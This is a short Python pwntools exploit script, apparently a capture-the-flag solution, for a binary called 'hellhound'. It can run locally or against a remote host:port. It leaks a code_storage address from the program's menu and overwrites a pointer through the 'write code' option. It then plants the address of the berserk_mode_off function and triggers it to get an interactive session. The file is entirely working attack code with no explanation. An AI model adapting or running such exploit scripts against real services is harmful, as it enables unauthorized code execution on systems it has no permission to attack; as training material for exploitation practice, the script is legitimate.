#!/usr/bin/env python3

from pwn import *

context.binary = 'hellhound'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def main():
    p = get_process()

    p.sendlineafter(b'>> ', b'1')
    p.recvuntil(b': [')
    code_storage_addr = int(p.recvuntil(b']', drop=True).decode())
    log.info(f'code_storage address: {hex(code_storage_addr)}')

    p.sendlineafter(b'>> ', b'2')
    p.sendafter(b'[*] Write some code: ', b'A' * 8 + p64(code_storage_addr + 0x50))

    p.sendlineafter(b'>> ', b'3')

    p.sendlineafter(b'>> ', b'2')
    p.sendafter(b'[*] Write some code: ', p64(context.binary.sym.berserk_mode_off) + p64(0))

    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'>> ', b'69')
    p.interactive()


if __name__ == '__main__':
    main()
